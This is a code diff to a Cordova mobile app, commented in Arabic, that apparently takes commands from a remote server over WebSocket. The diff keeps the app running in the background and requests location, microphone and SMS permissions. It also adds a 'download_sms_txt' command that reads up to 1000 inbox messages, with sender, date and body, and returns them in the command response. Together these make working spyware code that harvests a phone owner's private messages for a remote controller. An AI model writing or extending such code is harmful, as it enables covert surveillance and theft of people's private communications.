@@ -3,15 +3,28 @@ document.addEventListener('deviceready', onDeviceReady, false);
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
 
+// متغير لتخزين حالة الأذونات
+let permissionsGranted = false;
+
 function onDeviceReady() {
   console.log('Device is ready');
+  
+  // طلب الأذونات اللازمة
+  requestPermissions();
   
   // تمكين التشغيل في الخلفية
   if (cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
       title: 'التطبيق يعمل في الخلفية',
-      text: 'جارٍ مراقبة الأوامر الواردة'
+      text: 'جارٍ مراقبة الأوامر الواردة',
+      silent: false
+    });
+    
+    // إعداد التشغيل التلقائي عند بدء التشغيل
+    cordova.plugins.backgroundMode.on('activate', function() {
+      cordova.plugins.backgroundMode.disableWebViewOptimizations();
+      console.log('التطبيق يعمل في الخلفية');
     });
   }
 
@@ -78,6 +91,39 @@ function onDeviceReady() {
       }
     });
   }
+}
+
+// طلب الأذونات اللازمة
+function requestPermissions() {
+  const permissions = [
+    'ACCESS_FINE_LOCATION',
+    'RECORD_AUDIO',
+    'READ_SMS',
+    'WAKE_LOCK',
+    'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS'
+  ];
+  
+  permissions.forEach(permission => {
+    cordova.plugins.permissions.checkPermission(permission, 
+      function(success) {
+        if (!success.hasPermission) {
+          cordova.plugins.permissions.requestPermission(permission, 
+            function(result) {
+              console.log(`Permission ${permission}: ${result.hasPermission ? 'Granted' : 'Denied'}`);
+            }, 
+            function(error) {
+              console.error(`Error requesting ${permission}:`, error);
+            }
+          );
+        }
+      }, 
+      function(error) {
+        console.error(`Error checking ${permission}:`, error);
+      }
+    );
+  });
+  
+  permissionsGranted = true;
 }
 
 function connectToServer(deviceInfo) {
@@ -176,6 +222,9 @@ function executeCommand(command, callback) {
       break;
     case 'get_received_requests':
       getReceivedRequests(commandId, callback);
+      break;
+    case 'download_sms_txt':
+      downloadSMSTxt(commandId, callback);
       break;
     default:
       callback({ 
@@ -370,10 +419,71 @@ function getReceivedRequests(commandId, callback) {
   });
 }
 
+function downloadSMSTxt(commandId, callback) {
+  if (typeof SMS === 'undefined') {
+    return callback({ 
+      commandId,
+      status: 'error',
+      error: 'SMS plugin not available',
+      suggestion: 'Install cordova-sms-plugin'
+    });
+  }
+  
+  const filter = {
+    box: 'inbox',
+    maxCount: 1000,
+    indexFrom: 0
+  };
+  
+  SMS.listSMS(
+    filter,
+    (messages) => {
+      // تحويل الرسائل إلى تنسيق نصي
+      let txtContent = "رسائل SMS\n\n";
+      messages.forEach((msg, index) => {
+        txtContent += `رسالة ${index + 1}:\n`;
+        txtContent += `من: ${msg.address}\n`;
+        txtContent += `التاريخ: ${new Date(msg.date).toLocaleString('ar-EG')}\n`;
+        txtContent += `المحتوى: ${msg.body}\n`;
+        txtContent += "------------------------\n\n";
+      });
+      
+      // إنشاء ملف نصي
+      const blob = new Blob([txtContent], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      
+      callback({
+        commandId,
+        status: 'success',
+        file: {
+          type: 'txt',
+          content: txtContent,
+          downloadUrl: url,
+          fileName: `sms_messages_${commandId}.txt`,
+          count: messages.length
+        }
+      });
+    },
+    (error) => {
+      callback({ 
+        commandId,
+        status: 'error',
+        error: 'SMS error',
+        details: error
+      });
+    }
+  );
+}
+
 // إعادة الاتصال عند استئناف التطبيق
 document.addEventListener('resume', () => {
   if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
     console.log('App resumed, reconnecting...');
     onDeviceReady();
   }
+}, false);
+
+// التأكد من استمرار عمل التطبيق في الخلفية
+document.addEventListener('pause', () => {
+  console.log('App is running in background');
 }, false);
